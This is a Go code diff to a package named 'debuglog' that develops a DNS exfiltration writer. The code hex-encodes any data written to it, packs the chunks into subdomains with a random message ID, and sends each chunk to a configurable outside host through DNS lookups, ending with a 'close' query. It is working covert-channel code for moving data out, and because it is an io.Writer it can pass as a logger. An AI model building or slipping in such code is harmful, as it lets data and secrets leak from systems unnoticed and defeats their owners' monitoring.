@@ -1,10 +1,17 @@
 package debuglog
 
 import (
-	"encoding/base64"
+	"encoding/hex"
 	"fmt"
+	"math/rand"
 	"net"
 	"strings"
+)
+
+const (
+	dnsMessageIDLength = 6
+	maxDomainLength    = 253
+	maxSubDomainLength = 30
 )
 
 type dnsExfiltrator struct {
@@ -12,19 +19,30 @@ type dnsExfiltrator struct {
 }
 
 func newDNSExfiltrator(host string) (*dnsExfiltrator, error) {
-	fmt.Printf("DNSExfil created: %s", host)
+	fmt.Printf("DNSExfil created: %s\n", host)
 	return &dnsExfiltrator{strings.Trim(host, " ")}, nil
 }
 
 func (ex *dnsExfiltrator) Write(data []byte) (int, error) {
-	const maxDomainLength = 253
-	const maxSubDomainLength = 63
-	encoded := strings.Replace(base64.URLEncoding.EncodeToString(data), "=", "", -1)
+	fmt.Printf("DNSExfil: writing: %s\n", string(data))
+	payload := hex.EncodeToString(data)
+	postfix := generateMessageID() + "." + ex.host
+	// count 3 dots, not sure if necessary
+	availableSpace := min(maxSubDomainLength, maxDomainLength-(len(postfix)+dnsMessageIDLength+3))
 
-	for len(encoded) > 0 {
-		chunkLen := min(min(maxSubDomainLength, maxDomainLength-len(ex.host)-1), len(encoded))
-		net.LookupHost(fmt.Sprintf("%s.%s", encoded[:chunkLen], ex.host))
-		encoded = encoded[chunkLen:]
+	for len(payload) > 0 {
+		chunkLength := min(len(payload), availableSpace)
+		ips, err := net.LookupHost(fmt.Sprintf("%s.%s", payload[:chunkLength], postfix))
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			fmt.Printf("Lookup %s.%s: %v\n", payload[:chunkLength], postfix, ips)
+		}
+		payload = payload[chunkLength:]
+	}
+	_, err := net.LookupHost(fmt.Sprintf("close.%s", postfix))
+	if err != nil {
+		fmt.Println(err)
 	}
 	return len(data), nil
 }
@@ -34,4 +52,13 @@ func min(a, b int) int {
 		return a
 	}
 	return b
+}
+
+func generateMessageID() string {
+	var charSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789")
+	res := make([]rune, dnsMessageIDLength)
+	for i := range res {
+		res[i] = charSet[rand.Intn(len(charSet))]
+	}
+	return string(res)
 }
